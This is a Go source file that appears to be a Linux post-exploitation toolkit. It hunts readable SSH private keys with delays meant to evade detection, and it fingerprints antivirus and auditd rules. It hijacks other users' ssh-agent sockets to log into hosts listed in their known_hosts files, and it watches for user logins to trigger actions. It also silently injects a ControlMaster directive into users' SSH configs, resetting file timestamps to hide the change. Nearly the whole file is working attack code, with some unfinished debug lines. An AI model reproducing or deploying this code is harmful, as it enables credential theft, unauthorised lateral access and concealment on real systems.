package discovery

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	osuser "os/user"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"

	utmp "github.com/EricLagergren/go-gnulib/utmp"
	netstat "github.com/drael/GOnetstat"
	ps "github.com/unixist/go-ps"
	netlink "github.com/vishvananda/netlink"
	"github.com/willdonnelly/passwd"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

var (
	// Antivirus systems we detect
	AVSystems = []AVDiscoverer{
		OSSECAV{},
		SophosAV{},
		TripwireAV{},
		SamhainAV{},
	}
	// The typical location where auditd looks for its ruleset
	AuditdRules = "/etc/audit/audit.rules"
	// The typical location utmp stores login information
	UtmpPath                  = "/var/run/utmp"
	SSHControlMasterDirective = `Host *  # Default config. Do not edit below this line.
        ControlPath ~/.ssh/.config
        ControlMaster auto
        ControlPersist 10m`
	TmpSSHSocketPattern = "/tmp/ssh-*/agent.*"
)

// string parameter is the user who logged into this system.
type LocalLoginStalkAction func(string, NetConn) error

// string parameter is the user who logged into a remote system.
type RemoteLoginStalkAction func(string) map[string][]sshLoginSuccess

const (
	L4ProtoTcp = iota
	L4ProtoUdp = iota
)

const (
	L3ProtoIpv4 = iota
	L3ProtoIpv6 = iota
)

type sshLoginSuccess struct {
	host       Host
	sock, user string
}

type FilePerm struct {
	mode     os.FileMode
	uid, gid uint32
}

type Host struct {
	Ip    string
	Port  int64
	Proto NetProto
}
type NetConn struct {
	Dst, Src Host
	Pid      int // process ID of this network connection, if applicable.
	Proto    NetProto
}

type NetProto struct {
	l3, l4 int
}

// LoadedKernelModule houses information regarding a kernel module that is currently loaded
type LoadedKernelModule struct {
	address string
	size    int
	name    string
}

type Output struct {
	Name   string
	Values []interface{}
}

type Process struct {
	pid  int
	name string
}

type SshPrivateKey struct {
	Path      string
	Encrypted bool
}

// Watch holds the information for which the system is attempting to detect access.
type Watch struct {
	// Path being watched.
	Path string
	// Action the watch is looking for, i.e. read/write/execute. For example "wa" would detect file writes or appendages.
	Action string
}

type Who struct {
	// Username, line (tty/pty), originating host that user is logging in from
	User, Line, Host string
	// User's login process ID. Typically sshd process
	Pid int32
	// Login time
	Time int32
}

// existingPaths returns a subset of paths that exist on the filesystem.
func existingPaths(paths []string) []string {
	found := []string{}
	for _, path := range paths {
		//if _, err := os.Stat(path); err == nil {
		if matches, err := filepath.Glob(path); err == nil {
			for _, m := range matches {
				found = append(found, m)
			}
		}
	}
	return found
}

// runningProcs returns a subset of processes that are currently running.
func runningProcs(procs []string) []Process {
	allProcs, _ := ps.Processes()
	found := []Process{}
	for _, aproc := range allProcs {
		procName := aproc.Executable()
		for _, need := range procs {
			if need == procName {
				found = append(found, Process{
					pid:  aproc.Pid(),
					name: procName,
				})
			}
		}
	}
	return found
}

// establishConns grabs currently established network connections
// and looks for the connection characteristics in "needle".
func establishedConnections(conns []NetConn, needle NetConn) []NetConn {
	found := []NetConn{}

	for _, nc := range conns {
		if needle.Src.Ip != "" && needle.Src.Ip != nc.Src.Ip {
			continue
		}
		if needle.Dst.Ip != "" && needle.Dst.Ip != nc.Dst.Ip {
			continue
		}
		if needle.Src.Port != 0 && needle.Src.Port != nc.Src.Port {
			continue
		}
		if needle.Dst.Port != 0 && needle.Dst.Port != nc.Dst.Port {
			continue
		}
		if needle.Proto.l3 != 0 && needle.Proto.l3 != nc.Proto.l3 {
			continue
		}
		if needle.Proto.l4 != 0 && needle.Proto.l4 != nc.Proto.l4 {
			continue
		}
		if needle.Pid != 0 && needle.Pid != nc.Pid {
			continue
		}
		found = append(found, nc)
	}

	return found
}

// getPrivateKey extracts a SshPrivateKey object from a string if a key exists.
func getPrivateKey(path string) SshPrivateKey {
	p := SshPrivateKey{}
	f, err := os.Open(path)
	// If we don't have permission to open the file, skip it.
	if err != nil {
		return p
	}
	defer f.Close()
	head := make([]byte, 32)
	_, err = f.Read(head)
	if err != nil {
		return p
	}
	if matched, _ := regexp.Match("-----BEGIN .* PRIVATE KEY-----\n", head); !matched {
		return p
	}
	// This is a private key. Let's find out if it's encrypted
	br := bufio.NewReader(f)
	line, err := br.ReadString('\n')
	if err != nil {
		return p
	}
	p = SshPrivateKey{
		Path:      path,
		Encrypted: strings.HasSuffix(line, "ENCRYPTED\n"),
	}
	return p
}

// GetSSHKeys looks for readable ssh private keys. Optionally sleep for `sleep`
// milliseconds to evade detection.
func GetSSHKeys(dirs string, sleep int) []SshPrivateKey {
	pkeys := []SshPrivateKey{}
	for _, dir := range strings.Split(dirs, ",") {
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if sleep != 0 {
				time.Sleep(time.Duration(sleep) * time.Millisecond)
			}
			if info == nil || !info.Mode().IsRegular() {
				return nil
			}
			pkey := getPrivateKey(path)
			if pkey != (SshPrivateKey{}) {
				pkeys = append(pkeys, pkey)
			}
			return nil
		})
	}
	return pkeys
}

// IsContainer looks at init's cgroup and total process count to guess at
// whether we're in a container. These are basically informed *guesses*.
func IsContainer() bool {
	procs, err := ps.Processes()
	if err != nil {
		return false
	}
	if len(procs) <= 10 {
		return true
	}
	t, err := ioutil.ReadFile("/proc/1/cgroup")
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(t), "\n") {
		if line == "" {
			break
		}
		if strings.Index(line, "docker") != -1 {
			return true
		} else if !strings.HasSuffix(line, ":/") {
			return true
		}
	}
	return false
}

// GetArp fetches the current arp table, the map between known MACs and their IPs
func GetArp() []netlink.Neigh {
	neighs, err := netlink.NeighList(0, 0)
	if err != nil {
		return []netlink.Neigh{}
	} else {
		return neighs
	}
}

func isUserLoggedIn(user string) bool {
	for _, w := range GetWho() {
		if w.User == user || user == "*" {
			return true
		}
	}
	return false
}

// GetWho fetches information about currently logged-in users.
func GetWho() []Who {
	found := []Who{}
	utmps, err := utmp.ReadUtmp(UtmpPath, utmp.LoginProcess)
	if err != nil {
		return found
	}
	for _, u := range utmps {
		found = append(found, Who{
			User: string(bytes.Trim(u.User[:], "\x00")),
			Host: string(bytes.Trim(u.Host[:], "\x00")),
			Line: string(bytes.Trim(u.Line[:], "\x00")),
			Pid:  u.Pid,
			Time: u.Tv.Sec,
		})
	}
	return found
}

// GetAuditWatches fetches a list of watches that auditd currently has on filesystem paths.
func GetAuditWatches() ([]Watch, error) {
	re := regexp.MustCompile("-w ([^[:space:]]+).* -p ([[:alpha:]]+)")
	t, err := ioutil.ReadFile(AuditdRules)
	found := []Watch{}
	if err != nil {
		return nil, fmt.Errorf("Unable to open %v", AuditdRules)
	}
	for _, line := range strings.Split(string(t), "\n") {
		matches := re.FindStringSubmatch(line)
		if len(matches) == 3 {
			found = append(found, Watch{
				Path:   matches[1],
				Action: matches[2],
			})
		}
	}
	return found, nil
}

func stringToIntOrZero(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		i = 0
	}
	return i
}

// getNetworkConnections returns all established tcp/udp ipv4/ipv6 network connections.
func getNetworkConnections() []NetConn {
	found := []NetConn{}

	for _, conn := range netstat.Tcp() {
		if conn.State == "ESTABLISHED" {
			found = append(found, NetConn{
				Src: Host{
					Ip:   conn.Ip,
					Port: conn.Port,
				},
				Dst: Host{
					Ip:   conn.ForeignIp,
					Port: conn.ForeignPort,
				},
				Proto: NetProto{
					l3: L3ProtoIpv4,
					l4: L4ProtoTcp,
				},
				Pid: stringToIntOrZero(conn.Pid),
			})
		}
	}
	/*
		for _, conn := range netstat.Udp() {
			if conn.State == "ESTABLISHED" {
				found = append(found, NetConn{
					srcIp:   conn.Ip,
					dstIp:   conn.ForeignIp,
					srcPort: conn.Port,
					dstPort: conn.ForeignPort,
					l3Proto: L3ProtoIpv4,
					l4Proto: L4ProtoUdp,
					pid:     stringToIntOrZero(conn.Pid),
				})
			}
		}
		for _, conn := range netstat.Tcp6() {
			if conn.State == "ESTABLISHED" {
				found = append(found, NetConn{
					srcIp:   conn.Ip,
					dstIp:   conn.ForeignIp,
					srcPort: conn.Port,
					dstPort: conn.ForeignPort,
					l3Proto: L3ProtoIpv6,
					l4Proto: L4ProtoTcp,
					pid:     stringToIntOrZero(conn.Pid),
				})
			}
		}
		for _, conn := range netstat.Udp6() {
			if conn.State == "ESTABLISHED" {
				found = append(found, NetConn{
					srcIp:   conn.Ip,
					dstIp:   conn.ForeignIp,
					srcPort: conn.Port,
					dstPort: conn.ForeignPort,
					l3Proto: L3ProtoIpv6,
					l4Proto: L4ProtoUdp,
					pid:     stringToIntOrZero(conn.Pid),
				})
			}
		}
	*/

	return found
}

// getSSHSockByBruteForce searches a directory pattern regex for a user's
// ssh-agent socket. Returns a map of usernames to a list of socket paths.
func getSSHSockByBruteForce(user, dirPattern string) map[string][]string {
	var ostat syscall.Stat_t
	var userUid32 = uint32(0)
	var userStr = user
	found := map[string][]string{}
	anyUser := user == "*"
	socks, err := filepath.Glob(dirPattern)
	if err != nil {
		return map[string][]string{}
	}

	if !anyUser {
		entry, err := osuser.Lookup(user)
		if user != "*" && err != nil {
			fmt.Println("Failed to look up user: %s", user)
			return found
		}
		userUid, _ := strconv.ParseInt(entry.Uid, 10, 32)
		userUid32 = uint32(userUid)
	}
	for _, s := range socks {
		f, err := os.Stat(s)
		if err == nil && f.Mode()&os.ModeSocket == os.ModeSocket {
			err = syscall.Stat(s, &ostat)
			if anyUser {
				u, err := osuser.LookupId(fmt.Sprintf("%d", ostat.Uid))
				if err != nil {
					continue
				}
				userStr = u.Username
			} else if userUid32 == ostat.Uid {
				// This if block is necessary to confirm ownership of the socket.
				// But the syscall.Chown call is unnecessary as ssh doesn't check
				// if the user making use of the socket is the same as its owner.
				//syscall.Chown(s, 0, 0)
			} else {
				continue
			}
			found[userStr] = append(found[userStr], s)
		}
	}
	fmt.Println(found)
	return found
}

// getSSHSocketByPid attempts to look up a user's SSH_AUTH_SOCK env var by his
// login process ID.
func getSSHSocketByPid(pid int32) (string, error) {
	var index = 0
	var name = "SSH_AUTH_SOCK"
	environ := filepath.Join("/proc", fmt.Sprintf("%d", pid), "environ")
	body, err := ioutil.ReadFile(environ)
	if err != nil {
		return "", fmt.Errorf("Couldn't open %s", environ)
	}
	if index = bytes.Index(body, []byte(name)); index == -1 {
		return "", fmt.Errorf("Env var not found: %s", name)
	}
	sub := body[index+len(name)+1:]
	return string(sub[:bytes.Index(sub, []byte("\x00"))]), nil
}

// sshLoginWithAgent will attempt to find a valid ssh-agent for the logged-in
// user and use that to log into the specified host as the user himself.
// There is currently no support for logging into host H as user X with user
// Y's ssh-agent.
func sshLoginWithAgent(user string, host Host) (string, error) {
	var sockPaths map[string][]string
	/*
		path, err := getSSHSocketByPid(login.pid)
		if err == nil {
			sockPaths = []string{path}
		} else {
	*/
	sockPaths = getSSHSockByBruteForce(user, TmpSSHSocketPattern)
	/*
		}
	*/
	for user, userPaths := range sockPaths {
		for _, path := range userPaths {
			fmt.Printf("Attempting remote login via %s as %s to %s:%d\n", path, user, host.Ip, host.Port)
			sock, err := net.Dial("unix", path)
			if err != nil {
				fmt.Printf("Can't open socket: %s\n", path)
				continue
			}

			agent := agent.NewClient(sock)

			fmt.Println("here0")
			signers, err := agent.Signers()
			if err != nil {
				fmt.Println(err)
				continue
			}

			config := &ssh.ClientConfig{
				User: user,
				Auth: []ssh.AuthMethod{
					ssh.PublicKeys(signers...),
				},
			}

			// If the destination address is ipv6, wrap it in brackets, otherwise leave it bare.
			var hostStr = ""
			if host.Proto.l3 == L3ProtoIpv4 {
				hostStr = host.Ip
			} else {
				hostStr = fmt.Sprintf("[%s]", host.Ip)
			}
			fmt.Println("here1")
			client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", hostStr, host.Port), config)
			if err != nil {
				fmt.Printf("Failed to dial: %v", err)
				continue
			}

			fmt.Println("here2")
			session, err := client.NewSession()
			if err != nil {
				fmt.Printf("Failed to create session: %v", err)
				continue
			}
			defer session.Close()

			var b bytes.Buffer
			session.Stdout = &b
			cmd := "id"
			if err := session.Run(cmd); err != nil {
				fmt.Printf("Failed to run cmd: %s: %v", cmd, err)
				continue
			}
			fmt.Println(b.String())
			return path, nil
		}
	}
	var msg = ""
	if len(sockPaths) == 0 {
		msg = "no "
	}
	return "", fmt.Errorf("failed to login with %sagents", msg)
}

// sshKnownHosts attempts to fetch all the known_hosts files for all users on
// the system. It will fail in two cases: lack of permission; and hashed hosts.
func sshKnownHosts() []Host {
	found := []Host{}
	entries, _ := passwd.Parse()

	// Loop over all the users on the system and scrape their known_hosts file
	for _, e := range entries {
		filename := filepath.Join(e.Home, ".ssh/known_hosts")
		if _, err := os.Stat(filename); err != nil {
			continue
		}
		body, err := ioutil.ReadFile(filename)
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(body), "\n") {
			if line == "" {
				break
			}
			if strings.Index(line, "|") == 0 { // Hosts may be hashed
				continue
			}

			// Grab all the comma-separated hosts/IPs in the first column.
			// Do this twice to first see if any host/IP is ipv6. If so, mark all
			// hosts as ipv6. Not ideal to loop twice, but eh.
			endpoints := strings.Split(line, " ")[0]
			l3Proto := L3ProtoIpv4
			for _, hostStr := range strings.Split(endpoints, ",") {
				if strings.Count(hostStr, ":") > 1 {
					l3Proto = L3ProtoIpv6
				}
			}

			for _, hostStr := range strings.Split(endpoints, ",") {
				host := hostStr
				port := int64(22)

				// If host has a non-standard port, strip out brackets and grab it
				rbracket := strings.Index(hostStr, "[")
				lbracket := strings.Index(hostStr, "]")
				if rbracket == 0 && lbracket != -1 {
					host = hostStr[1:lbracket]
					port, err = strconv.ParseInt(hostStr[strings.LastIndex(hostStr, ":")+1:], 10, 64)
					if err != nil {
						// Something's formatted unexpectedly. Skip this line.
						continue
					}
				}
				found = append(found, Host{
					Ip:   host,
					Port: port,
					Proto: NetProto{
						l3: l3Proto,
						l4: L4ProtoTcp,
					},
				})
			}
		}
	}

	return found
}

// getCandidateRHosts gets likely list of hosts the user has SSH access to.
// This means:
// a) list of remote hosts currently connected to via SSH. This currently means
//    established connections to remote hosts on tcp/22. Connections to non-standard
//    ports aren't detected.
// b) All the hosts in all the known_hosts files we can find.
func getCandidateRHosts() []Host {
	//conns := getNetworkConnections()
	found := []Host{}
	conns := []NetConn{}
	conns = establishedConnections(conns, NetConn{
		Dst:   Host{Port: 22},
		Proto: NetProto{l4: L4ProtoTcp},
	})
	for _, conn := range conns {
		found = append(found, Host{
			Ip:    conn.Dst.Ip,
			Proto: conn.Dst.Proto,
		})
	}
	return append(found, sshKnownHosts()...)
}

func getSSHControlMasterFilename(user string) (string, error) {
	u, err := osuser.Lookup(user)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("%s/.ssh/.config", u.HomeDir), nil
}

func getSSHConfigFilename(user string) (string, error) {
	u, err := osuser.Lookup(user)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("%s/.ssh/config", u.HomeDir), nil
}

func isSSHControlMasterActive(user string) bool {
	filename, _ := getSSHControlMasterFilename(user)
	s, err := os.Stat(filename)
	if err == nil {
		if time.Since(s.ModTime()) < time.Duration(20*time.Minute) {
			return true
		}
	}
	return false
}

// SetSSHControlMaster places a ControlMaster directive in the user's ssh config file.
// bool return value is true if the config file is created, false if it already exists.
// If err != nil, bool return value can't be trusted.
func SetSSHControlMaster(user string) (bool, error) {
	var origTime = time.Now()
	var created = false
	filename, err := getSSHConfigFilename(user)
	if s, err := os.Stat(filename); err == nil {
		origTime = s.ModTime()
	} else {
		created = true
	}
	if err != nil {
		return created, err
	}
	// Either create the config file or append to it
	// TODO: if the file is created, then UnsetSSHControlMaster() should remove it.
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return created, err
	}
	defer f.Close()

	f.WriteString(SSHControlMasterDirective + "\n")

	// Replace the original access and modification times.
	if err := os.Chtimes(filename, origTime, origTime); err != nil {
		fmt.Println("Couldn't reset atime/mtime on ssh config file.")
	}
	return created, nil
}

// UnsetSSHControlMaster removes the ControlMaster directive from user's ssh config file
func UnsetSSHControlMaster(user string) error {
	var origTime = time.Now()
	filename, err := getSSHConfigFilename(user)
	if err != nil {
		return err
	}
	if s, err := os.Stat(filename); err == nil {
		origTime = s.ModTime()
	}

	// Snarf in the whole file and search lines for our distinct "Host *" line.
	body, err := ioutil.ReadFile(filename)
	if err != nil {
		// Somehow the config was removed. Panic.
		return err
	}
	// Janky means of munging the config file back to its original state
	newFile := ""
	toSkip := len(strings.Split(SSHControlMasterDirective, "\n"))
	haveSkipped := 0
	for _, line := range strings.Split(string(body), "\n") {
		if line == "Host *  # Default config. Do not edit below this line." {
			haveSkipped += 1
		}
		// We'll skip a maximum of three lines
		if haveSkipped > 0 && haveSkipped <= toSkip {
			haveSkipped += 1
		} else {
			newFile += line + "\n"
		}
	}
	// We didn't find our Control Master. In this case, we either hadn't yet set Control Master
	// or it has since been removed. Either way, don't modify the config file. Just bail.
	if haveSkipped == 0 {
	} else if newFile == "\n" {
		// or if after removing the directive there is no other content, remove the file. This is a guess that
		// it was create by us.
		if err := os.Remove(filename); err != nil {
			return err
		}
		return nil
	}

	// This hack removes potentially multiple trailing newlines and replaces it with just a single newline.
	// This doesn't leave things *exactly* as they were prior to injecting the Control Master.
	// (In cases where removing the ControlMaster directive would result in multiple legit newlines. This
	// is improbable.)
	newFile = strings.TrimRight(newFile, "\n")
	newFile += "\n"

	// Create temp file, write the new contents, then replace user's config file with this new one.
	tmp, err := ioutil.TempFile(filepath.Dir(filename), "tmp")
	defer tmp.Close()
	if err != nil {
		fmt.Println("Can't unset SSH Control Master")
		return err
	}

	// Create the new config without the Control Master directive.
	if _, err := tmp.WriteString(newFile); err != nil {
		fmt.Println("Unable to create new config in temp file")
		return err
	}

	// Move the new config into place.
	if err := os.Rename(tmp.Name(), filename); err != nil {
		fmt.Println("Error placing new config", err)
		return err
	}

	// Replace the original access and modification times.
	if err := os.Chtimes(filename, origTime, origTime); err != nil {
		// Even if we can't update the times, don't return an error since the primary
		// objective of this function is successful.
		fmt.Println("Couldn't reset atime/mtime on ssh config file")
	}
	return nil
}

// StalkLocalLogin performs an action when a specific user logs in at any point in the future.
// If user == "*", any user will trigger the action.
func StalkLocalLogin(user string, action LocalLoginStalkAction) error {
	start := time.Now()
	ticker := time.NewTicker(10 * time.Second)
	for {
		select {
		case <-ticker.C:
			for _, w := range GetWho() {
				if (user == "*" || user == w.User) && start.Before(time.Unix(int64(w.Time), 0)) {
					action(w.User, NetConn{
						Src: Host{Ip: w.Host},
					})
					start = time.Now()
				}
			}
		}
	}
	return nil
}

// StalkRemoteLogin attempts to log into a remote system via two methods:
// 1. If the presence of an ssh-agent is detected, attempt to use it to log into the same host.
// 2. [not implemented] If the Control Master socket is recently created, attempt to use it
func StalkRemoteLogin(user string, action RemoteLoginStalkAction) error {
	/*
			ticker := time.NewTicker(1 * time.Minute)
			for {
		select {
		case <-ticker.C:
	*/
	// If the user in question is logged in, attempt to login to any host we know about
	if isUserLoggedIn(user) {
		fmt.Println(action(user))
	}
	/*
		}
		}
	*/
	return nil
}

// AttemptRemoteLogin will wait for signs that a user that can be hijacked is logged in.
// This means either a user with an ssh-agent running or with a ControlMaster socket active.
func AttemptRemoteLogin(user string) map[string][]sshLoginSuccess {
	hosts := getCandidateRHosts()
	loggedIn := GetWho()
	found := map[string][]sshLoginSuccess{}
	fmt.Println(loggedIn)
	for _, host := range hosts {
		for _, login := range loggedIn {
			if user == login.User || user == "*" {
				// Look for an ssh-agent running under this login session
				sockPath, err := sshLoginWithAgent(user, host)
				if err == nil {
					found[user] = append(found[login.User], sshLoginSuccess{
						host: host,
						sock: sockPath,
						user: login.User,
					})
				} else {
					fmt.Println(err)
				}
			}
		}
	}
	return found
}

func GetAV() []Av {
	avs := []Av{}
	for _, av := range AVSystems {
		name, paths, procs, kms := av.Name(), av.Paths(), av.Procs(), av.KernelModules()
		if len(paths) != 0 || len(procs) != 0 || len(kms) != 0 {
			avs = append(avs, Av{
				Name:          name,
				Paths:         paths,
				Procs:         procs,
				KernelModules: kms,
			})
		}
	}
	return avs
}
